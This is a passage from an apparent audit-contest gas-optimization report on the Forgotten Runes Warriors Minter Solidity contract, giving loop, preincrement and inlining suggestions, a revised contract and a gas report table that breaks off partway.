refunds).\r\n\r\nLoop counter increments can safely use unchecked addition in most cases. For example, [`ForgottenRunesWarriorsMinter.sol#bidSummon`](https://github.com/code-423n4/2022-05-runes/blob/060b4f82b79c8308fe65674a39a07c44fa586cd3/contracts/ForgottenRunesWarriorsMinter.sol#L162)\r\n```solidity\r\n        for (uint256 i = 0; i < numWarriors; i++) {\r\n            _mint(msg.sender);\r\n        }\r\n```\r\n\r\nCan be rewritten as:\r\n\r\n```solidity\r\n        for (uint256 i = 0; i < numWarriors;) {\r\n            _mint(msg.sender);\r\n            unchecked { ++i; }\r\n        }\r\n```\r\n\r\nThis saves around 100 gas/loop.\r\n\r\nPotential optimizations:\r\n- [`publicSummon#L220`](https://github.com/code-423n4/2022-05-runes/blob/060b4f82b79c8308fe65674a39a07c44fa586cd3/contracts/ForgottenRunesWarriorsMinter.sol#L220)\r\n- [`teamSummon#L259`](https://github.com/code-423n4/2022-05-runes/blob/060b4f82b79c8308fe65674a39a07c44fa586cd3/contracts/ForgottenRunesWarriorsMinter.sol#L259)\r\n- [`issueRefunds#355`](https://github.com/code-423n4/2022-05-runes/blob/060b4f82b79c8308fe65674a39a07c44fa586cd3/contracts/ForgottenRunesWarriorsMinter.sol#L355)\r\n\r\n\r\n### Inline unused locals\r\n\r\nThe `node` local variable in [`claimSummon#L242`](https://github.com/code-423n4/2022-05-runes/blob/060b4f82b79c8308fe65674a39a07c44fa586cd3/contracts/ForgottenRunesWarriorsMinter.sol#L242) is unused and can be inlined:\r\n\r\n```solidity\r\n        require(\r\n            MerkleProof.verify(_merkleProof, claimlistMerkleRoot, keccak256(abi.encodePacked(msg.sender))),\r\n            'Invalid proof'\r\n        );\r\n```\r\n\r\nThe `elapsed` and `steps` variables in [`currentDaPrice#L289`](https://github.com/code-423n4/2022-05-runes/blob/060b4f82b79c8308fe65674a39a07c44fa586cd3/contracts/ForgottenRunesWarriorsMinter.sol#L289) can similarly be inlined:\r\n\r\n```solidity\r\n        uint256 stepDeduction = ((block.timestamp - daStartTime) / daDropInterval) * dropPerStep;\r\n```\r\n\r\nThese have a very minor impact and you may prefer readability.\r\n\r\n### Use preincrement operators\r\n\r\nThe preincrement operator (`++value`) is the cheapest way to increment a value. `value += 1` or `value++` can be rewritten as `++value`. This has a very minor impact (11 gas), but it's an easy optimization.\r\n\r\nPotential optimizations:\r\n- [`mintListSummon#L193`](https://github.com/code-423n4/2022-05-runes/blob/060b4f82b79c8308fe65674a39a07c44fa586cd3/contracts/ForgottenRunesWarriorsMinter.sol#L193)\r\n- [`claimSummon#L248`](https://github.com/code-423n4/2022-05-runes/blob/060b4f82b79c8308fe65674a39a07c44fa586cd3/contracts/ForgottenRunesWarriorsMinter.sol#L248)\r\n\r\n### Don't initialize empty storage variables\r\n\r\nSetting the empty storage variable `numMinted` to `0` and `METADATA_PROVENANCE_HASH` to `''` in `ForgottenRunesWarriorsGuild.sol` can be omitted.\r\n\r\nThis does not save runtime gas: it only reduces the gas cost at deployment time.\r\n\r\n### All optimizations\r\n\r\nHere is a revised version of `ForgottenRunesWarriorsMinter.sol` with all the above optimizations.\r\n\r\n```solidity\r\npragma solidity ^0.8.0;\r\n\r\nimport '@openzeppelin/contracts/token/ERC721/ERC721.sol';\r\nimport '@openzeppelin/contracts/token/ERC20/IERC20.sol';\r\nimport '@openzeppelin/contracts/security/ReentrancyGuard.sol';\r\nimport '@openzeppelin/contracts/security/Pausable.sol';\r\nimport '@openzeppelin/contracts/access/Ownable.sol';\r\nimport '@openzeppelin/contracts/utils/cryptography/MerkleProof.sol';\r\nimport './interfaces/IWETH.sol';\r\nimport './interfaces/IForgottenRunesWarriorsGuild.sol';\r\n\r\nimport \"@openzeppelin/contracts/utils/math/SafeCast.sol\";\r\n\r\n/**\r\n * @dev This implements the minter of the Forgotten Runes Warriors Guild. They are {ERC721} tokens.\r\n */\r\ncontract ForgottenRunesWarriorsMinter is Ownable, Pausable, ReentrancyGuard {\r\n    /// @notice The start timestamp for the Dutch Auction (DA) sale and price\r\n    uint256 public daStartTime =\r\n        0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff;\r\n\r\n    /// @notice The start timestamp for mintlisters\r\n    /// @dev This is the end of DA phase. No more DA bids when this is hit\r\n    uint256 public mintlistStartTime =\r\n        0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff;\r\n\r\n    /// @notice The start timestamp for the public sale\r\n    uint256 public publicStartTime =\r\n        0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff;\r\n\r\n    /// @notice The start timestamp for the claims\r\n    uint256 public claimsStartTime =\r\n        0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff;\r\n\r\n    /// @notice The start timestamp for self refunds\r\n    uint256 public selfRefundsStartTime =\r\n        0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff;\r\n\r\n    /// @notice The main Merkle root\r\n    bytes32 public mintlist1MerkleRoot;\r\n\r\n    /// @notice The secondary Merkle root\r\n    /// @dev Having a backup merkle root lets us atomically update the merkletree without downtime on the frontend\r\n    bytes32 public mintlist2MerkleRoot;\r\n\r\n    /// @notice The claimslist Merkle root\r\n    bytes32 public claimlistMerkleRoot;\r\n\r\n    /// @notice The address of the Warriors contract\r\n    IForgottenRunesWarriorsGuild public warriors;\r\n\r\n    /// @notice The address of the vault\r\n    address public vault;\r\n\r\n    /// @notice The address of the WETH contract\r\n    address public weth;\r\n\r\n    /// @notice The start price of the DA\r\n    uint256 public startPrice = 2.5 ether;\r\n\r\n    /// @notice The lowest price of the DA\r\n    uint256 public lowestPrice = 0.6 ether;\r\n\r\n    /// @notice The length of time for the price curve in the DA\r\n    uint256 public daPriceCurveLength = 380 minutes;\r\n\r\n    /// @notice The interval of time in which the price steps down\r\n    uint256 public daDropInterval = 10 minutes;\r\n\r\n    /// @notice The final price of the DA. Will be updated when DA is over and then used for subsequent phases\r\n    uint256 public finalPrice = 2.5 ether;\r\n\r\n    /// @notice An array of the addresses of the DA minters\r\n    /// @dev An entry is created for every da minting tx, so the same minter address is quite likely to appear more than once\r\n    address[] public daMinters;\r\n\r\n    struct Bid {\r\n        uint16 daNumMinted;\r\n        uint96 daAmountPaid;\r\n        uint96 daAmountRefunded;\r\n    }\r\n    mapping(address => Bid) public daBids;\r\n\r\n    /// @notice Tracks if a given address minted in the mintlist\r\n    mapping(address => bool) public mintlistMinted;\r\n\r\n    /// @notice Tracks the total count of NFTs claimed by a given address\r\n    mapping(address => bool) public claimlistMinted;\r\n\r\n    /// @notice The total number of tokens reserved for the DA phase\r\n    uint256 public maxDaSupply = 8000;\r\n\r\n    /// @notice Tracks the total count of NFTs sold (vs. freebies)\r\n    uint256 public numSold;\r\n\r\n    /// @notice Tracks the total count of NFTs for sale\r\n    uint256 public maxForSale = 14190;\r\n\r\n    /// @notice Tracks the total count of NFTs claimed for free\r\n    uint256 public numClaimed;\r\n\r\n    /// @notice Tracks the total count of NFTs that can be claimed\r\n    /// @dev While we will have a merkle root set for this group, putting a hard cap helps limit the damage of any problems with an overly-generous merkle tree\r\n    uint256 public maxForClaim = 1100;\r\n\r\n    /**\r\n     * @dev Create the contract and set the initial baseURI\r\n     * @param _warriors address the initial warriors contract address\r\n     */\r\n    constructor(IForgottenRunesWarriorsGuild _warriors, address _weth) {\r\n        setWarriorsAddress(_warriors);\r\n        setWethAddress(_weth);\r\n        setVaultAddress(msg.sender);\r\n    }\r\n\r\n    /*\r\n     * Timeline:\r\n     *\r\n     * bidSummon       : |------------|\r\n     * mintlistSummon  :              |------------|-------------------------------------|\r\n     * publicSummon    :                           |------------|------------------------|\r\n     * claimSummon     :                                        |------------|-----------|\r\n     * teamSummon      : |---------------------------------------------------------------|\r\n     */\r\n\r\n    /**\r\n     * @notice Mint a Warrior in the Dutch Auction phase\r\n     * @param numWarriors uint256 of the number of warriors you're trying to mint\r\n     */\r\n    function bidSummon(uint256 numWarriors)\r\n        external\r\n        payable\r\n        nonReentrant\r\n        whenNotPaused\r\n    {\r\n        require(numSold < maxDaSupply, 'Auction sold out');\r\n        require(numSold + numWarriors <= maxDaSupply, 'Not enough remaining');\r\n        require(daStarted(), 'Auction not started');\r\n        require(!mintlistStarted(), 'Auction phase over');\r\n        require(\r\n            numWarriors > 0 && numWarriors <= 20,\r\n            'You can summon no more than 20 Warriors at a time'\r\n        );\r\n\r\n        uint256 currentPrice = currentDaPrice();\r\n        require(\r\n            msg.value >= (currentPrice * numWarriors),\r\n            'Ether value sent is not sufficient'\r\n        );\r\n\r\n        daMinters.push(msg.sender);\r\n\r\n        Bid memory bid = daBids[msg.sender];\r\n        bid.daAmountPaid += SafeCast.toUint96(msg.value);\r\n        bid.daNumMinted += SafeCast.toUint16(numWarriors);\r\n        daBids[msg.sender] = bid;\r\n\r\n        numSold += numWarriors;\r\n\r\n        if (numSold == maxDaSupply) {\r\n            // optimistic: save gas by not setting on every mint, but will\r\n            // require manual `setFinalPrice` before refunds if da falls short\r\n            finalPrice = currentPrice;\r\n        }\r\n\r\n        for (uint256 i = 0; i < numWarriors;) {\r\n            _mint(msg.sender);\r\n            unchecked { ++i; }\r\n        }\r\n    }\r\n\r\n    /**\r\n     * @notice Mint a Warrior in the mintlist phase (paid)\r\n     * @param _merkleProof bytes32[] your proof of being able to mint\r\n     */\r\n    function mintlistSummon(bytes32[] calldata _merkleProof)\r\n        external\r\n        payable\r\n        nonReentrant\r\n        whenNotPaused\r\n    {\r\n        require(numSold < maxForSale, 'Sold out');\r\n        require(mintlistStarted(), 'Mintlist phase not started');\r\n        require(msg.value == finalPrice, 'Ether value incorrect');\r\n\r\n        // verify didn't already mint\r\n        require(mintlistMinted[msg.sender] == false, 'Already minted');\r\n        mintlistMinted[msg.sender] = true;\r\n\r\n        // verify mintlist merkle\r\n        bytes32 node = keccak256(abi.encodePacked(msg.sender));\r\n        require(\r\n            MerkleProof.verify(_merkleProof, mintlist1MerkleRoot, node) ||\r\n                MerkleProof.verify(_merkleProof, mintlist2MerkleRoot, node),\r\n            'Invalid proof'\r\n        );\r\n\r\n        numSold += 1;\r\n        _mint(msg.sender);\r\n    }\r\n\r\n    /**\r\n     * @notice Mint a Warrior in the Public phase (paid)\r\n     * @param numWarriors uint256 of the number of warriors you're trying to mint\r\n     */\r\n    function publicSummon(uint256 numWarriors)\r\n        external\r\n        payable\r\n        nonReentrant\r\n        whenNotPaused\r\n    {\r\n        require(numSold < maxForSale, 'Sold out');\r\n        require(numSold + numWarriors <= maxForSale, 'Not enough remaining');\r\n        require(publicStarted(), 'Public sale not started');\r\n        require(\r\n            numWarriors > 0 && numWarriors <= 20,\r\n            'You can summon no more than 20 Warriors at a time'\r\n        );\r\n        require(\r\n            msg.value == (finalPrice * numWarriors),\r\n            'Ether value sent is incorrect'\r\n        );\r\n\r\n        numSold += numWarriors;\r\n        for (uint256 i = 0; i < numWarriors;) {\r\n            _mint(msg.sender);\r\n            unchecked { ++i; }\r\n        }\r\n    }\r\n\r\n    /**\r\n     * @dev claim a warrior for free if you're in the claimlist\r\n     * @param _merkleProof bytes32[] the proof that you're eligible to mint here\r\n     */\r\n    function claimSummon(bytes32[] calldata _merkleProof)\r\n        external\r\n        nonReentrant\r\n        whenNotPaused\r\n    {\r\n        require(numClaimed < maxForClaim, 'No more claims');\r\n        require(claimsStarted(), 'Claim phase not started');\r\n\r\n        // verify didn't already claim\r\n        require(claimlistMinted[msg.sender] == false, 'Already claimed');\r\n        claimlistMinted[msg.sender] = true;\r\n\r\n        require(\r\n            MerkleProof.verify(_merkleProof, claimlistMerkleRoot, keccak256(abi.encodePacked(msg.sender))),\r\n            'Invalid proof'\r\n        );\r\n\r\n        ++numClaimed;\r\n        _mint(msg.sender);\r\n    }\r\n\r\n    /**\r\n     * @notice Mint a Warrior (owner only)\r\n     * @param recipient address the address of the recipient\r\n     * @param count uint256 of the number of warriors you're trying to mint\r\n     */\r\n    function teamSummon(address recipient, uint256 count) external onlyOwner {\r\n        require(address(recipient) != address(0), 'address req');\r\n        for (uint256 i = 0; i < count;) {\r\n            _mint(recipient);\r\n            unchecked { ++i; }\r\n        }\r\n    }\r\n\r\n    function _mint(address recipient) private {\r\n        warriors.mint(recipient);\r\n    }\r\n\r\n    /*\r\n     * View utilities\r\n     */\r\n\r\n    /**\r\n     * @notice returns the current dutch auction price\r\n     */\r\n    function currentDaPrice() public view returns (uint256) {\r\n        if (!daStarted()) {\r\n            return startPrice;\r\n        }\r\n        if (block.timestamp >= daStartTime + daPriceCurveLength) {\r\n            // end of the curve\r\n            return lowestPrice;\r\n        }\r\n\r\n        uint256 dropPerStep = (startPrice - lowestPrice) /\r\n            (daPriceCurveLength / daDropInterval);\r\n        uint256 stepDeduction = ((block.timestamp - daStartTime) / daDropInterval) * dropPerStep;\r\n\r\n        // don't go negative in the next step\r\n        if (stepDeduction > startPrice) {\r\n            return lowestPrice;\r\n        }\r\n        uint256 currentPrice = startPrice - stepDeduction;\r\n        return currentPrice > lowestPrice ? currentPrice : lowestPrice;\r\n    }\r\n\r\n    /**\r\n     * @notice returns whether the dutch auction has started\r\n     */\r\n    function daStarted() public view returns (bool) {\r\n        return block.timestamp > daStartTime;\r\n    }\r\n\r\n    /**\r\n     * @notice returns whether the mintlist has started\r\n     */\r\n    function mintlistStarted() public view returns (bool) {\r\n        return block.timestamp > mintlistStartTime;\r\n    }\r\n\r\n    /**\r\n     * @notice returns whether the public mint has started\r\n     */\r\n    function publicStarted() public view returns (bool) {\r\n        return block.timestamp > publicStartTime;\r\n    }\r\n\r\n    /**\r\n     * @notice returns whether the claims phase has started\r\n     */\r\n    function claimsStarted() public view returns (bool) {\r\n        return block.timestamp > claimsStartTime;\r\n    }\r\n\r\n    /**\r\n     * @notice returns whether self refunds phase has started\r\n     */\r\n    function selfRefundsStarted() public view returns (bool) {\r\n        return block.timestamp > selfRefundsStartTime;\r\n    }\r\n\r\n    /**\r\n     * @notice returns the number of minter addresses in the DA phase (includes duplicates)\r\n     */\r\n    function numDaMinters() external view returns (uint256) {\r\n        return daMinters.length;\r\n    }\r\n\r\n    function daNumMinted(address bidder) external view returns (uint256) {\r\n        return daBids[bidder].daNumMinted;\r\n    }\r\n\r\n    function daAmountPaid(address bidder) external view returns (uint256) {\r\n        return daBids[bidder].daAmountPaid;\r\n    }\r\n\r\n    function daAmountRefunded(address bidder) external view returns (uint256) {\r\n        return daBids[bidder].daAmountRefunded;\r\n    }\r\n\r\n    /*\r\n     * Refund logic\r\n     */\r\n\r\n    /**\r\n     * @notice issues refunds for the accounts in minters between startIdx and endIdx inclusive\r\n     * @param startIdx uint256 the starting index of daMinters\r\n     * @param endIdx uint256 the ending index of daMinters, inclusive\r\n     */\r\n    function issueRefunds(uint256 startIdx, uint256 endIdx)\r\n        public\r\n        onlyOwner\r\n        nonReentrant\r\n    {\r\n        for (uint256 i = startIdx; i < endIdx + 1;) {\r\n            _refundAddress(daMinters[i]);\r\n            unchecked { ++i; }\r\n        }\r\n    }\r\n\r\n    /**\r\n     * @notice issues a refund for the address\r\n     * @param minter address the address to refund\r\n     */\r\n    function refundAddress(address minter) public onlyOwner nonReentrant {\r\n        _refundAddress(minter);\r\n    }\r\n\r\n    /**\r\n     * @notice refunds msg.sender what they're owed\r\n     */\r\n    function selfRefund() public nonReentrant {\r\n        require(selfRefundsStarted(), 'Self refund period not started');\r\n        _refundAddress(msg.sender);\r\n    }\r\n\r\n    function _refundAddress(address minter) private {\r\n        uint256 owed = refundOwed(minter);\r\n        if (owed > 0) {\r\n            daBids[minter].daAmountRefunded += SafeCast.toUint96(owed);\r\n            _safeTransferETHWithFallback(minter, owed);\r\n        }\r\n    }\r\n\r\n    /**\r\n     * @notice returns the amount owed the address\r\n     * @param minter address the address of the account that wants a refund\r\n     */\r\n    function refundOwed(address minter) public view returns (uint256) {\r\n        Bid memory bid = daBids[minter];\r\n        return bid.daAmountPaid - (finalPrice * bid.daNumMinted) - bid.daAmountRefunded;\r\n    }\r\n\r\n    /**\r\n     * @notice Transfer ETH. If the ETH transfer fails, wrap the ETH and try send it as WETH.\r\n     * @param to account who to send the ETH or WETH to\r\n     * @param amount uint256 how much ETH or WETH to send\r\n     */\r\n    function _safeTransferETHWithFallback(address to, uint256 amount) internal {\r\n        if (!_safeTransferETH(to, amount)) {\r\n            IWETH(weth).deposit{value: amount}();\r\n            IERC20(weth).transfer(to, amount);\r\n        }\r\n    }\r\n\r\n    /**\r\n     * @notice Transfer ETH and return the success status.\r\n     * @dev This function only forwards 30,000 gas to the callee.\r\n     * @param to account who to send the ETH to\r\n     * @param value uint256 how much ETH to send\r\n     */\r\n    function _safeTransferETH(address to, uint256 value)\r\n        internal\r\n        returns (bool)\r\n    {\r\n        (bool success, ) = to.call{value: value, gas: 30_000}(new bytes(0));\r\n        return success;\r\n    }\r\n\r\n    /*\r\n     * Only the owner can do these things\r\n     */\r\n\r\n    /**\r\n     * @notice pause the contract\r\n     */\r\n    function pause() public onlyOwner {\r\n        _pause();\r\n    }\r\n\r\n    /**\r\n     * @notice unpause the contract\r\n     */\r\n    function unpause() public onlyOwner {\r\n        _unpause();\r\n    }\r\n\r\n    /**\r\n     * @notice set the dutch auction start timestamp\r\n     */\r\n    function setDaStartTime(uint256 _newTime) public onlyOwner {\r\n        daStartTime = _newTime;\r\n    }\r\n\r\n    /**\r\n     * @notice set the mintlist start timestamp\r\n     */\r\n    function setMintlistStartTime(uint256 _newTime) public onlyOwner {\r\n        mintlistStartTime = _newTime;\r\n    }\r\n\r\n    /**\r\n     * @notice set the public sale start timestamp\r\n     */\r\n    function setPublicStartTime(uint256 _newTime) public onlyOwner {\r\n        publicStartTime = _newTime;\r\n    }\r\n\r\n    /**\r\n     * @notice set the claims phase start timestamp\r\n     */\r\n    function setClaimsStartTime(uint256 _newTime) public onlyOwner {\r\n        claimsStartTime = _newTime;\r\n    }\r\n\r\n    /**\r\n     * @notice set the self refund phase start timestamp\r\n     */\r\n    function setSelfRefundsStartTime(uint256 _newTime) public onlyOwner {\r\n        selfRefundsStartTime = _newTime;\r\n    }\r\n\r\n    /**\r\n     * @notice A convenient way to set all phase times at once\r\n     * @param newDaStartTime uint256 the dutch auction start time\r\n     * @param newMintlistStartTime uint256 the mintlst phase start time\r\n     * @param newPublicStartTime uint256 the public phase start time\r\n     * @param newClaimsStartTime uint256 the claims phase start time\r\n     */\r\n    function setPhaseTimes(\r\n        uint256 newDaStartTime,\r\n        uint256 newMintlistStartTime,\r\n        uint256 newPublicStartTime,\r\n        uint256 newClaimsStartTime\r\n    ) public onlyOwner {\r\n        // we put these checks here instead of in the setters themselves\r\n        // because they're just guardrails of the typical case\r\n        require(\r\n            newPublicStartTime >= newMintlistStartTime,\r\n            'Set public after mintlist'\r\n        );\r\n        require(\r\n            newClaimsStartTime >= newPublicStartTime,\r\n            'Set claims after public'\r\n        );\r\n        setDaStartTime(newDaStartTime);\r\n        setMintlistStartTime(newMintlistStartTime);\r\n        setPublicStartTime(newPublicStartTime);\r\n        setClaimsStartTime(newClaimsStartTime);\r\n    }\r\n\r\n    /**\r\n     * @notice set the merkle root for the mintlist phase\r\n     */\r\n    function setMintlist1MerkleRoot(bytes32 newMerkleRoot) public onlyOwner {\r\n        mintlist1MerkleRoot = newMerkleRoot;\r\n    }\r\n\r\n    /**\r\n     * @notice set the alternate merkle root for the mintlist phase\r\n     * @dev we have two because it lets us idempotently update the website without downtime\r\n     */\r\n    function setMintlist2MerkleRoot(bytes32 newMerkleRoot) public onlyOwner {\r\n        mintlist2MerkleRoot = newMerkleRoot;\r\n    }\r\n\r\n    /**\r\n     * @notice set the merkle root for the claimslist phase\r\n     */\r\n    function setClaimlistMerkleRoot(bytes32 newMerkleRoot) public onlyOwner {\r\n        claimlistMerkleRoot = newMerkleRoot;\r\n    }\r\n\r\n    /**\r\n     * @notice set the vault address where the funds are withdrawn\r\n     */\r\n    function setVaultAddress(address _newVaultAddress) public onlyOwner {\r\n        vault = _newVaultAddress;\r\n    }\r\n\r\n    /**\r\n     * @notice set the warriors token address\r\n     */\r\n    function setWarriorsAddress(\r\n        IForgottenRunesWarriorsGuild _newWarriorsAddress\r\n    ) public onlyOwner {\r\n        warriors = _newWarriorsAddress;\r\n    }\r\n\r\n    /**\r\n     * @notice set the weth token address\r\n     */\r\n    function setWethAddress(address _newWethAddress) public onlyOwner {\r\n        weth = _newWethAddress;\r\n    }\r\n\r\n    /**\r\n     * @notice set the dutch auction start price\r\n     */\r\n    function setStartPrice(uint256 _newPrice) public onlyOwner {\r\n        startPrice = _newPrice;\r\n    }\r\n\r\n    /**\r\n     * @notice set the dutch auction lowest price\r\n     */\r\n    function setLowestPrice(uint256 _newPrice) public onlyOwner {\r\n        lowestPrice = _newPrice;\r\n    }\r\n\r\n    /**\r\n     * @notice set the length of time the dutch auction price should change\r\n     */\r\n    function setDaPriceCurveLength(uint256 _newTime) public onlyOwner {\r\n        daPriceCurveLength = _newTime;\r\n    }\r\n\r\n    /**\r\n     * @notice set how long it takes for the dutch auction to step down in price\r\n     */\r\n    function setDaDropInterval(uint256 _newTime) public onlyOwner {\r\n        daDropInterval = _newTime;\r\n    }\r\n\r\n    /**\r\n     * @notice set \"final\" price of the dutch auction\r\n     * @dev this is set automatically if the dutch-auction sells out, but needs to be set manually if the DA fails to sell out\r\n     */\r\n    function setFinalPrice(uint256 _newPrice) public onlyOwner {\r\n        finalPrice = _newPrice;\r\n    }\r\n\r\n    /**\r\n     * @notice the max supply available in the dutch auction\r\n     */\r\n    function setMaxDaSupply(uint256 _newSupply) public onlyOwner {\r\n        maxDaSupply = _newSupply;\r\n    }\r\n\r\n    /**\r\n     * @notice the total max supply available for sale in any phase\r\n     */\r\n    function setMaxForSale(uint256 _newSupply) public onlyOwner {\r\n        maxForSale = _newSupply;\r\n    }\r\n\r\n    /**\r\n     * @notice the max supply available in the claimlist\r\n     */\r\n    function setMaxForClaim(uint256 _newSupply) public onlyOwner {\r\n        maxForClaim = _newSupply;\r\n    }\r\n\r\n    /**\r\n     * @notice Withdraw funds to the vault\r\n     * @param _amount uint256 the amount to withdraw\r\n     */\r\n    function withdraw(uint256 _amount) public onlyOwner {\r\n        require(address(vault) != address(0), 'no vault');\r\n        require(payable(vault).send(_amount));\r\n    }\r\n\r\n    /**\r\n     * @notice Withdraw all funds to the vault\r\n     */\r\n    function withdrawAll() public payable onlyOwner {\r\n        require(address(vault) != address(0), 'no vault');\r\n        require(payable(vault).send(address(this).balance));\r\n    }\r\n\r\n    /**\r\n     * @dev ERC20s should not be sent to this contract, but if someone\r\n     * does, it's nice to be able to recover them\r\n     * @param token IERC20 the token address\r\n     * @param amount uint256 the amount to send\r\n     */\r\n    function forwardERC20s(IERC20 token, uint256 amount) public onlyOwner {\r\n        require(address(msg.sender) != address(0));\r\n        token.transfer(msg.sender, amount);\r\n    }\r\n}\r\n```\r\n\r\nGas report after. (Note that optimizer runs are increased to 200000):\r\n\r\n```\r\n·------------------------------------------------------------|---------------------------|----------------|-----------------------------·\r\n|                    Solc version: 0.8.6                     ·  Optimizer enabled: true  ·  Runs: 200000  ·  Block limit: 30000000 gas  │\r\n·····························································|···························|················|······························\r\n|  Methods                                                                                                                              │\r\n·································|···························|·············|·············|················|···············|··············\r\n|  Contract                      ·  Method                   ·  Min        ·  Max        ·  Avg           ·  # calls      ·  usd (avg)  │\r\n·································|···························|·············|·············|················|···············|··············\r\n|  ForgottenRunesWarriorsGuild   ·  burn                     ·          -  ·          -  ·         31174  ·            1  ·          -  │\r\n·································|···························|·············|·············|················|···············|··············\r\n|  ForgottenRunesWarriorsGuild   ·  initialize               ·      46198  ·      46210  ·         46209  ·           90  ·          -  │\r\n·································|···························|·············|·············|················|···············|··············\r\n|  ForgottenRunesWarriorsGuild   ·  mint                     ·      61513  ·      95713  ·         82888  ·            4  ·          -  │\r\n·································|···························|·············|·············|················|···············|··············\r\n|  ForgottenRunesWarriorsGuild   ·  setBaseURI               ·          -  ·          -  ·         31978  ·            1  ·          -  │\r\n·································|···························|·············|·············|················|···············|··············\r\n|  ForgottenRunesWarriorsGuild   ·  setMinter                ·          -  ·          -  ·         46084  ·            3  ·          -  │\r\n·································|···························|·············|·············|················|···············|··············\r\n|  ForgottenRunesWarriorsGuild   ·  setProvenanceHash        ·          -  ·          -  ·         46840  ·            1  ·          -  │\r\n·································|···························|·············|·············|················|···············|··············\r\n|  ForgottenRunesWarriorsGuild   ·  uploadAttributes         ·          -  ·          -  ·         23975  ·            1  ·          -  │\r\n·································|···························|·············|·············|················|···············|··············\r\n|  ForgottenRunesWarriorsGuild   ·  uploadImage              ·          -  ·          -  ·         23963  ·            1  ·          -  │\r\n·································|···························|·············|·············|················|···············|··············\r\n|  ForgottenRunesWarriorsGuild   ·  withdrawAll              ·          -  ·          -  ·         23581  ·            1  ·          -  │\r\n·································|···························|·············|·············|················|···············|··············\r\n|  ForgottenRunesWarriorsMinter  ·  bidSummon                ·     153755  ·     730219  ·        267431  ·           18  ·          -  │\r\n·································|···························|·············|·············|················|···············|··············\r\n|  ForgottenRunesWarriorsMinter  ·  claimSummon              ·          -  ·          -  ·        158012  ·            6  ·          -  │\r\n·································|···························|·············|·············|················|···············|··············\r\n|  ForgottenRunesWarriorsMinter  ·  issueRefunds             ·      48595  ·     122392  ·         85448  ·            5  ·          -  │\r\n·································|···························|·············|·············|················|···············|··············\r\n|  ForgottenRunesWarriorsMinter  ·  mintlistSummon           ·     125927  ·     160127  ·        151577  ·            8  ·          -  │\r\n·································|···························|·············|·············|················|···············|··············\r\n|  ForgottenRunesWarriorsMinter  ·  pause                    ·          -  ·          -  ·         27687  ·            2  ·          -  │\r\n·································|···························|·············|·············|················|···············|··············\r\n|  ForgottenRunesWarriorsMinter  ·  publicSummon             ·     110447  ·     650502  ·        487884  ·           20  ·          -  │\r\n·································|···························|·············|·············|················|···············|··············\r\n|  ForgottenRunesWarriorsMinter  ·  selfRefund               ·          -  ·          -  ·         41205  ·            2  ·          -  │\r\n·································|···························|·············|·············|················|···············|··············\r\n|  ForgottenRunesWarriorsMinter  ·  setClaimlistMerkleRoot   ·          -  ·          -  ·         46097  ·            5  ·          -  │\r\n·································|···························|·············|·············|················|···············|··············\r\n|  ForgottenRunesWarriorsMinter  ·  setClaimsStartTime       ·          -  ·          -  ·         28669  ·            1  ·          -  │\r\n·································|···························|·············|·············|················|···············|··············\r\n|  ForgottenRunesWarriorsMinter  ·  setDaDropInterval        ·          -  ·          -  ·         28647  ·            1  ·          -  │\r\n·································|···························|·············|·············|················|···············|··············\r\n|  ForgottenRunesWarriorsMinter  ·  setDaPriceCurveLength    ·          -  ·          -  ·         28648  ·            1  ·          -  │\r\n·································|···························|·············|·············|················|···············|··············\r\n|  ForgottenRunesWarriorsMinter  ·  setDaStartTime           ·          -  ·          -  ·         28645  ·            1  ·          -  │\r\n·································|···························|·············|·············|················|···············|··············\r\n|  ForgottenRunesWarriorsMinter  ·  setFinalPrice            ·      28624  ·      28684  ·         28680  ·           15  ·          -  │\r\n·································|···························|·············|·············|················|···············|··············\r\n|  ForgottenRunesWarriorsMinter  ·  setMaxDaSupply           ·          -  ·          -  ·         28689  ·            3  ·          -  │\r\n·································|···························|·············|·············|················|···············|··············\r\n|  ForgottenRunesWarriorsMinter  ·  setMaxForClaim           ·          -  ·          -  ·         28667  ·            2  ·          -  │\r\n·································|···························|·············|·············|················|···············|··············\r\n|  ForgottenRunesWarriorsMinter  ·  setMaxForSale            ·          -  ·          -  ·         28647  ·            3  ·          -  │\r\n·································|···························|·············|·············|················|···············|··············\r\n|  ForgottenRunesWarriorsMinter  ·  setMintlist1MerkleRoot   ·          -  ·          -  ·         46097  ·            9  ·          -  │\r\n·································|···························|·············|·············|················|···············|··············\r\n|  ForgottenRunesWarriorsMinter  ·  setMintlist2MerkleRoot   ·          -  ·          -  ·         46162  ·            1  ·          -  │\r\n·································|···························|·············|·············|················|···············|··············\r\n|  ForgottenRunesWarriorsMinter  ·  setMintlistStartTime     ·          -  ·          -  ·         28668  ·            1  ·          -  │\r\n·································|···························|·············|·············|················|···············|··············\r\n|  ForgottenRunesWarriorsMinter  ·  setPhaseTimes            ·      36538  ·      44938  ·         43927  ·           50  ·          -  │\r\n·································|···························|·············|·············|················|···············|··············\r\n|  ForgottenRunesWarriorsMinter  ·  setPublicStartTime       ·          -  ·          -  ·         28667  ·            1  ·          -  │\r\n·································|···························|·············|·············|················|···············|··············\r\n|  ForgottenRunesWarriorsMinter  ·  setSelfRefundsStartTime  ·      28646  ·      28682  ·         28664  ·            2  ·          -  │\r\n·································|···························|·············|·············|················|···············|··············\r\n|  ForgottenRunesWarriorsMinter  ·  setStartPrice            ·          -  ·          -  ·         28648  ·            2  ·          -  │\r\n·································|···························|·············|·············|················|···············|··············\r\n|  ForgottenRunesWarriorsMinter  ·  setVaultAddress          ·      26219  ·      29019  ·         28459  ·            5  ·          -  │\r\n·································|···························|·············|·············|················|···············|··············\r\n|  ForgottenRunesWarriorsMinter  ·  setWarriorsAddress       ·          -  ·          -  ·         28956  ·            1  ·          -  │\r\n·································|···························|·············|·············|················|···············|··············\r\n|  ForgottenRunesWarriorsMinter  ·  setWethAddress           ·          -  ·          -  ·         28998  ·            1  ·          -  │\r\n·································|···························|·············|·············|················|···············|··············\r\n|  ForgottenRunesWarriorsMinter  ·  teamSummon               ·     103636  ·     619563  ·        361600  ·            4  ·          -  │\r\n·································|···························|·············|·············|················|···············|··············\r\n|  ForgottenRunesWarriorsMinter  ·  unpause                  ·          -  ·          -  ·         27687  ·            1  ·          -  │\r\n·································|···························|·············|·············|················|···············|··············\r\n|  ForgottenRunesWarriorsMinter  ·  withdraw                 ·          -  ·          -  ·         35306  ·            1  ·          -  